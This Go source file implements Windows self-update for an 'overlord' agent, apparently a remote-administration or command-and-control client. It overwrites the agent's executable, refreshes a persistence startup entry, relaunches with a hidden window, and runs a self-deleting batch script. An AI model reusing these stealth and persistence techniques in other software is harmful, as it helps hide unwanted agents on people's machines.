//go:build windows
// +build windows

package handlers

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/internal/overlordenv"
	"overlord-client/cmd/agent/persistence"
)

func samePathByOS(left string, right string) bool {
	return strings.EqualFold(filepath.Clean(left), filepath.Clean(right))
}

func runAgentUpdate(sourcePath string, enablePersistence bool, hideWindow bool) error {
	currentExe, currentErr := resolveCurrentExecutableOnDisk()
	startupPath, startupEnabled, err := startupTargetPath(enablePersistence)
	if err != nil {
		return err
	}

	log.Printf("agent_update[win]: source=%q persistence=%v currentExe=%q currentErr=%v startupEnabled=%v startupPath=%q hideWindow=%v", sourcePath, enablePersistence, currentExe, currentErr, startupEnabled, startupPath, hideWindow)

	if currentErr != nil && !startupEnabled {
		return currentErr
	}

	restartPath := currentExe
	if startupEnabled {
		restartPath = startupPath
	}

	if restartPath == "" {
		return fmt.Errorf("no restart path available for update")
	}

	if startupEnabled {
		// Keep startup binary in sync when persistence/startup is enabled.
		if !samePath(startupPath, currentExe) {
			if err := backupExecutable(startupPath); err != nil {
				log.Printf("agent_update[win]: backup warning for startup path: %v", err)
			}
			if err := copyExecutableAtomic(sourcePath, startupPath); err != nil {
				return err
			}
		}
		if err := persistence.Configure(startupPath); err != nil {
			return fmt.Errorf("failed to refresh startup entry: %w", err)
		}
	}

	if currentErr != nil {
		log.Printf("agent_update[win]: current executable unavailable, using deferred updater for %q", restartPath)
		return launchDeferredUpdateScript(sourcePath, restartPath)
	}

	if shouldLaunchUploadedBinaryDirectly(currentExe, startupEnabled) {
		log.Printf("agent_update[win]: current executable appears transient (%q), launching uploaded binary directly: %q", currentExe, sourcePath)
		if err := startSilentProcess(sourcePath, nil, "", hideWindow); err != nil {
			return fmt.Errorf("failed to launch uploaded binary directly: %w", err)
		}
		return nil
	}

	if samePath(currentExe, restartPath) {
		log.Printf("agent_update[win]: target equals running executable, using deferred updater for %q", restartPath)
		return launchDeferredUpdateScript(sourcePath, restartPath)
	}

	if err := backupExecutable(restartPath); err != nil {
		log.Printf("agent_update[win]: backup warning for restart path: %v", err)
	}
	if err := copyExecutableAtomic(sourcePath, restartPath); err != nil {
		return err
	}
	_ = os.Remove(sourcePath)

	if err := startSilentProcess(restartPath, nil, "", hideWindow); err != nil {
		return fmt.Errorf("failed to launch updated agent: %w", err)
	}
	log.Printf("agent_update[win]: started updated executable directly: %q", restartPath)
	return nil
}

func launchDeferredUpdateScript(sourcePath string, targetPath string) error {
	scriptPath, debugLogPath, err := writeDeferredUpdateBatch(sourcePath, targetPath)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", scriptPath)
	cmd.Dir = filepath.Dir(scriptPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: windows.CREATE_NEW_CONSOLE}
	nullFile, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
	if err == nil {
		cmd.Stdin = nullFile
		cmd.Stdout = nullFile
		cmd.Stderr = nullFile
	}
	log.Printf("agent_update[win]: deferred updater script=%q debugLog=%q cmd=%q args=%v", scriptPath, debugLogPath, cmd.Path, cmd.Args)
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start deferred updater: %w", err)
	}
	log.Printf("agent_update[win]: deferred updater launched")
	return nil
}

func writeDeferredUpdateBatch(sourcePath string, targetPath string) (string, string, error) {
	tmpFile, err := os.CreateTemp("", "overlord-update-*.bat")
	if err != nil {
		return "", "", fmt.Errorf("failed to create deferred updater batch file: %w", err)
	}
	defer tmpFile.Close()

	debugLogPath := strings.TrimSpace(overlordenv.Getenv("OVERLORD_UPDATE_DEBUG_LOG"))
	if debugLogPath == "" {
		debugLogPath = filepath.Join(os.TempDir(), fmt.Sprintf("overlord-update-%d.log", os.Getpid()))
	}

	sourceVar := escapeBatchSetValue(sourcePath)
	targetVar := escapeBatchSetValue(targetPath)
	debugLogVar := escapeBatchSetValue(debugLogPath)

	// Retry copy for a few seconds to survive file-lock timing races during process shutdown.
	script := strings.Join([]string{
		"@echo off",
		"setlocal DisableDelayedExpansion",
		"set \"SRC=" + sourceVar + "\"",
		"set \"DST=" + targetVar + "\"",
		"set \"LOG=" + debugLogVar + "\"",
		"set \"COPIED=0\"",
		"echo ==== overlord deferred update ==== >> \"%LOG%\"",
		"echo script=%~f0 >> \"%LOG%\"",
		"echo src=%SRC% >> \"%LOG%\"",
		"echo dst=%DST% >> \"%LOG%\"",
		"echo start_time=%DATE% %TIME% >> \"%LOG%\"",
		"ping -n 3 127.0.0.1 >NUL",
		"for /L %%I in (1,1,8) do (",
		"  echo copy_attempt=%%I >> \"%LOG%\"",
		"  copy /Y \"%SRC%\" \"%DST%\" >> \"%LOG%\" 2>&1 && (set \"COPIED=1\" & goto copied)",
		"  ping -n 2 127.0.0.1 >NUL",
		")",
		":copied",
		"if \"%COPIED%\"==\"1\" (",
		"  echo copy_success=1 >> \"%LOG%\"",
		"  start \"\" \"%DST%\" >> \"%LOG%\" 2>&1",
		") else (",
		"  echo copy_success=0 >> \"%LOG%\"",
		")",
		"del /F /Q \"%SRC%\" >> \"%LOG%\" 2>&1",
		"echo end_time=%DATE% %TIME% >> \"%LOG%\"",
		"del /F /Q \"%~f0\" >NUL 2>&1",
		"exit /b 0",
	}, "\r\n") + "\r\n"

	if _, err := tmpFile.WriteString(script); err != nil {
		return "", "", fmt.Errorf("failed to write deferred updater batch file: %w", err)
	}

	log.Printf("agent_update[win]: wrote deferred updater script=%q debugLog=%q", tmpFile.Name(), debugLogPath)

	return tmpFile.Name(), debugLogPath, nil
}

func escapeBatchSetValue(value string) string {
	// In SET statements, double % avoids environment expansion at parse time.
	return strings.ReplaceAll(value, "%", "%%")
}

func shouldLaunchUploadedBinaryDirectly(currentExe string, startupEnabled bool) bool {
	if startupEnabled {
		return false
	}
	clean := strings.ToLower(filepath.Clean(currentExe))
	tempRoot := strings.ToLower(filepath.Clean(os.TempDir()))
	if strings.Contains(clean, `\go-build`) {
		return true
	}
	return strings.HasPrefix(clean, tempRoot+`\`)
}
